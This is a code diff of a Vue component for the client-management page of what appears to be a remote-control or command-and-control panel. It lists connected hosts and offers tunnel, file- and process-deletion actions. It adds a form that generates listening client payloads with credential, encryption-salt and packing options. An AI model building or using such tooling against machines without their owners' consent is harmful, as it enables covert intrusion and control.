@@ -1,10 +1,10 @@
 <script setup lang="ts">
 // 客户端管理：对齐 4.9.3 的表格列与操作（Ant Design Vue 实现）。
 // 列：ID / 状态 / 主机名 / 用户 / 系统 / 通道 / 外网地址 / 内网 IP / 进程 / 备注 / 操作
-import { h, onMounted, ref } from 'vue'
+import { h, onMounted, reactive, ref } from 'vue'
 import { useRouter } from 'vue-router'
 import { message, Modal } from 'ant-design-vue'
-import { post } from '../api/http'
+import { downloadURL, post } from '../api/http'
 
 const router = useRouter()
 const loading = ref(false)
@@ -14,6 +14,22 @@ const online = ref(0)
 const keyword = ref('')
 // 4.9.3 的搜索表单（vBWgKrY3R.js / searchFormSchema）：关键词 + 状态（在线/离线）
 const status = ref<string | undefined>(undefined)
+// 搜索表单默认收起、批量选择默认关闭（4.9.3 的 useSearchForm:false / rowSelection:false）
+const showSearch = ref(false)
+const batchSelect = ref(false)
+const forwardOpen = ref(false)
+const forward = reactive({ ebpf: false, tp: 'tcp', ip: '', port: 4444, ws: '', vkey: '', salt: '', proxy: '' })
+
+function toggleBatchSelect() {
+  batchSelect.value = !batchSelect.value
+  if (!batchSelect.value) checkedKeys.value = []
+}
+
+function resetSearch() {
+  keyword.value = ''
+  status.value = undefined
+  load()
+}
 const selected = ref<any>(null)
 const drawer = ref(false)
 const checkedKeys = ref<number[]>([])
@@ -27,6 +43,12 @@ function openCtx(e: MouseEvent, row: any) {
   ctxRow.value = row
   ctxPos.value = { x: e.clientX, y: e.clientY }
   ctxOpen.value = true
+}
+
+// 行内下拉与右键菜单共用同一套动作
+function ctxActionFor(row: any, key: string) {
+  ctxRow.value = row
+  ctxAction(key)
 }
 
 function ctxAction(key: string) {
@@ -97,6 +119,22 @@ function inlineEditRemark(row: any) {
   })
 }
 
+// 正向连接（4.9.3 的 AddClientDrawer）：按 ebpf/连接方式/地址 生成倾听型载荷
+function submitForward() {
+  if (!forward.vkey) { message.warning('请输入 Vkey'); return }
+  const host = forward.tp === 'ws' ? forward.ws : forward.ip
+  if (!host) { message.warning(forward.tp === 'ws' ? '请输入 WS 地址' : '请输入 IP 或域名'); return }
+  const arch = forward.ebpf ? 'linux_amd64' : 'windows_amd64'
+  const url = downloadURL('/download/listen', {
+    arch, tp: forward.tp === 'ws' ? 'ws' : forward.tp,
+    host: forward.ip || '0.0.0.0', port: forward.port,
+    vkey: forward.vkey, salt: forward.salt, upx: 'false',
+    listen: 'true', ebpf: String(forward.ebpf),
+  })
+  location.href = url
+  forwardOpen.value = false
+}
+
 async function load() {
   loading.value = true
   try {
@@ -138,11 +176,15 @@ async function editRemark(row: any) {
 function removeBatch() {
   if (!checkedKeys.value.length) { message.warning('先勾选客户端'); return }
   Modal.confirm({
-    title: `删除选中的 ${checkedKeys.value.length} 台客户端？`,
+    title: '温馨提示',
+    content: '是否确认删除已选中的客户端，包括文件和进程',
     onOk: async () => {
-      await post('/client/dellist', { id: checkedKeys.value })
-      message.success('已删除')
+      try {
+        await post('/client/dellist', { id: checkedKeys.value })
+        message.success('批量删除成功')
+      } catch { message.error('批量删除失败') }
       checkedKeys.value = []
+      batchSelect.value = false
       load()
     },
   })
@@ -162,7 +204,25 @@ function remove(row: any) {
 
 <template>
   <a-card :bordered="false">
+    <!-- 工具栏：搜索 / 批量选择 / 批量删除 / 正向连接（文案、图标、出现条件照 4.9.3
+         的 vBWgKrY3R.js：only 选中时出现"批量删除"，"正向连接"在最右） -->
     <div class="toolbar">
+      <a-button type="primary" @click="showSearch = !showSearch">
+        <span class="act i-ant-design:search-outlined" />搜索
+      </a-button>
+      <a-button @click="toggleBatchSelect">
+        <span class="act i-ant-design:select-outlined" />批量选择
+      </a-button>
+      <a-button v-if="checkedKeys.length" danger @click="removeBatch">
+        <span class="act i-ant-design:delete-outlined" />批量删除
+      </a-button>
+      <a-button type="primary" class="ml-auto" @click="forwardOpen = true">
+        <span class="act i-ant-design:plus-outlined" />正向连接
+      </a-button>
+      <span class="mono hint">共 {{ total }} 台，在线 {{ online }}</span>
+    </div>
+
+    <div v-if="showSearch" class="searchbar">
       <span class="lbl">关键词</span>
       <a-input v-model:value="keyword" placeholder="主机/用户/备注" style="width: 200px"
         allow-clear @press-enter="load" />
@@ -171,15 +231,14 @@ function remove(row: any) {
         <a-select-option value="1">在线</a-select-option>
         <a-select-option value="2">离线</a-select-option>
       </a-select>
-      <a-button @click="load">刷新</a-button>
-      <a-button danger :disabled="!checkedKeys.length" @click="removeBatch">删除</a-button>
-      <span class="mono hint">共 {{ total }} 台，在线 {{ online }}</span>
+      <a-button type="primary" @click="load">查询</a-button>
+      <a-button @click="resetSearch">重置</a-button>
     </div>
 
     <a-table
       :columns="columns" :data-source="rows" :loading="loading" row-key="Id" size="small"
       :scroll="{ x: 1400 }"
-      :row-selection="{ selectedRowKeys: checkedKeys, onChange: (keys: number[]) => (checkedKeys = keys) }"
+      :row-selection="batchSelect ? { selectedRowKeys: checkedKeys, onChange: (keys: number[]) => (checkedKeys = keys) } : undefined"
       :custom-row="(record: any) => ({ onContextmenu: (e: MouseEvent) => openCtx(e, record) })"
       :pagination="{ current: page, pageSize, total, showSizeChanger: true, showTotal: (t: number) => `共 ${t} 台` }"
       @change="(p: any) => { page = p.current; pageSize = p.pageSize; load() }"
@@ -216,19 +275,63 @@ function remove(row: any) {
           <a @click="open(record)">{{ record.HostName || '(未知)' }}</a>
         </template>
         <template v-else-if="column.key === 'action'">
+          <!-- 4.9.3：行内只放两个（主机管理 / 隧道代理，仅在线），其余进下拉 -->
           <a-space size="small">
-            <a-tooltip title="命令控制"><a @click="router.push(`/clientManager/terminal/${record.Id}`)">
-              <span class="act i-material-icon-theme:console" /></a></a-tooltip>
-            <a-tooltip title="文件管理"><a @click="router.push(`/clientManager/files/${record.Id}`)">
-              <span class="act i-grommet-icons:folder" /></a></a-tooltip>
-            <a-tooltip title="编辑备注"><a @click="editRemark(record)">
-              <span class="act i-ant-design:edit-outlined" /></a></a-tooltip>
-            <a-tooltip title="删除主机"><a class="danger" @click="remove(record)">
-              <span class="act i-grommet-icons:trash" /></a></a-tooltip>
+            <template v-if="record.IsConnect">
+              <a-tooltip title="主机管理"><a @click="router.push(`/clientManager/files/${record.Id}`)">
+                <span class="act i-grommet-icons:drag" /></a></a-tooltip>
+              <a-tooltip title="隧道代理"><a @click="router.push(`/tunnel/${record.Id}`)">
+                <span class="act i-fa6-solid:globe" /></a></a-tooltip>
+            </template>
+            <a-dropdown :trigger="['click']">
+              <a><span class="act i-ant-design:ellipsis-vertical" /></a>
+              <template #overlay>
+                <a-menu @click="(e: any) => ctxActionFor(record, String(e.key))">
+                  <a-menu-item v-if="record.IsConnect" key="delfile">
+                    <span class="act i-grommet-icons:trash" />删除文件
+                  </a-menu-item>
+                  <a-menu-item key="delhost">
+                    <span class="act i-grommet-icons:close" />删除主机
+                  </a-menu-item>
+                </a-menu>
+              </template>
+            </a-dropdown>
           </a-space>
         </template>
       </template>
     </a-table>
+
+    <!-- 正向连接（4.9.3 的 AddClientDrawer 字段：ebpf / 连接方式 / IP 或域名 / 端口 /
+         WS 地址 / Vkey / 流量加密盐 / 使用代理） -->
+    <a-modal v-model:open="forwardOpen" title="正向连接" :width="520" @ok="submitForward">
+      <a-form :label-col="{ style: 'width: 110px' }" :wrapper-col="{ span: 14 }">
+        <a-form-item label="ebpf客户端">
+          <a-radio-group v-model:value="forward.ebpf">
+            <a-radio-button :value="true">是</a-radio-button>
+            <a-radio-button :value="false">否</a-radio-button>
+          </a-radio-group>
+        </a-form-item>
+        <a-form-item label="连接方式">
+          <a-radio-group v-model:value="forward.tp">
+            <a-radio-button value="tcp">tcp</a-radio-button>
+            <a-radio-button value="kcp">kcp</a-radio-button>
+            <a-radio-button value="ws">ws</a-radio-button>
+          </a-radio-group>
+        </a-form-item>
+        <a-form-item v-if="forward.tp !== 'ws'" label="IP或域名">
+          <a-input v-model:value="forward.ip" placeholder="监听地址，如 0.0.0.0" />
+        </a-form-item>
+        <a-form-item v-if="forward.tp !== 'ws'" label="端口">
+          <a-input-number v-model:value="forward.port" :min="1" :max="65535" style="width: 100%" />
+        </a-form-item>
+        <a-form-item v-if="forward.tp === 'ws'" label="WS地址">
+          <a-input v-model:value="forward.ws" placeholder="格式：ws://192.168.1.1:8080/ws，支持 wss" />
+        </a-form-item>
+        <a-form-item label="Vkey"><a-input v-model:value="forward.vkey" placeholder="通信凭证，通信的校验密码" /></a-form-item>
+        <a-form-item label="流量加密盐"><a-input v-model:value="forward.salt" /></a-form-item>
+        <a-form-item label="使用代理"><a-input v-model:value="forward.proxy" placeholder="不使请留空" /></a-form-item>
+      </a-form>
+    </a-modal>
 
     <!-- 右键菜单：文案 / 图标 / 顺序 / 确认框文本全部照 4.9.3 的
          vBWgKrY3R.js（主机管理 / 隧道 / 删除文件 / 删除主机，前三项仅在线显示） -->
@@ -283,6 +386,8 @@ function remove(row: any) {
 <style scoped>
 .toolbar { display: flex; gap: 8px; align-items: center; margin-bottom: 12px; }
 .hint { color: rgba(0, 0, 0, 0.45); }
+.searchbar { display: flex; align-items: center; gap: 8px; margin: 0 0 12px; }
+.ml-auto { margin-left: auto; }
 .lbl { color: rgba(0, 0, 0, 0.65); font-size: 13px; }
 .danger { color: #ff4d4f; }
 .os-ico { width: 16px; height: 16px; display: inline-block; vertical-align: -3px; margin-right: 4px; }
